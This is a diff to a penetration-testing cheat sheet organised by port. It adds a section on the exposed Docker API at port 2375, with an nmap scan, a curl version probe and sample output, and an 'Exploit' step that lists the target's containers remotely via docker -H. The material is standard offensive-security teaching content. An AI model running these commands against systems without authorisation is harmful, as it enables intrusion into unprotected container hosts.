@@ -23,6 +23,7 @@
 * [Port 389](#port-389)
 * [Port 587](#port-587)
 * [Port 1433](#port-1433)
+* [Port 2375](#port-2375)
 * [Port 3389](#port-3389)
 * [Port 5672](#port-5672)
 * [Port 5985](#port-5985,-5986)
@@ -437,6 +438,49 @@ go -m pretty
 ```
 #### Execute command trough sqsh
 #### Activate xp_cmdshell
+
+
+
+## 🔻Port 2375
+
+Default docker port
+
+#### Nmap 
+```
+nmap -sV -p 2375 10.0.0.1
+```
+
+#### Detect version 
+```
+curl http://10.0.0.1:2375/version
+
+{
+  "Platform": {
+    "Name": "Docker Engine - Community"
+  },
+  "Components": [
+    {
+      "Name": "Engine",
+      "Version": "20.10.20",
+      "Details": {
+        "ApiVersion": "1.41",
+        "Arch": "amd64",
+        "BuildTime": "2022-10-18T18:18:12.000000000+00:00",
+        "Experimental": "false",
+        "GitCommit": "03df974",
+        "GoVersion": "go1.18.7",
+        "KernelVersion": "5.15.0-1022-aws",
+        "MinAPIVersion": "1.12",
+        "Os": "linux"
+      }]
+}
+```
+
+#### Exploit
+```
+# To test if we can run commands, we'll list the containers on the target
+docker -H tcp://10.0.0.1:2375 ps
+```
 
 
 ## 🔻Port 3389
